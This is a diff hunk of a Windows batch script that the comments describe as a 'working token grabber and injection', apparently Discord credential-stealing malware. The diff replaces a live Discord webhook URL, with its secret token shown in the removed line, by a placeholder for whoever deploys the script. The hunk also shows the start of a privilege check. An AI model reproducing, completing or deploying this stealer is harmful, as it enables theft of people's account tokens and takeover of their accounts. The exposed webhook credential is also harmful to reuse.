@@ -2,7 +2,7 @@
 :: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
 set currentdir=%~dp0
 cd %currentdir%
-set webhook=https://discord.com/api/webhooks/1020814175112536084/eKoM05Czt2y2Eq4KhKw-XuE3Q2oNbCljIP2ZRfUCOA8pQ8yFhxaRMgIsblywiuiDxHOd
+set webhook=YOUR_WEBHOOK_HERE
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
 :check_Permissions
     net session >nul 2>&1
